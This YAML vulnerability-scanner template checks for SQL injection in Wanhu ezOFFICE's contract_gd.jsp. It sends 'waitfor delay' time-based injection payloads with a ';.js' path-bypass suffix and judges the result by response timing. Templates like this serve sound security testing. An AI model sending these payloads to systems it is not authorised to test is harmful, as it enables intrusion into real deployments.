id: poc-yaml-wanhu-ezoffice-contract-gd-jsp-sqli
info:
  name: "万户 ezOFFICE contract_gd.jsp SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 万户ezOFFICE

http:
  - method: GET
    path:
      - '{{BaseURL}}/defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A5%27--'
      - '{{BaseURL}}/defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A8%27--'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 404
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
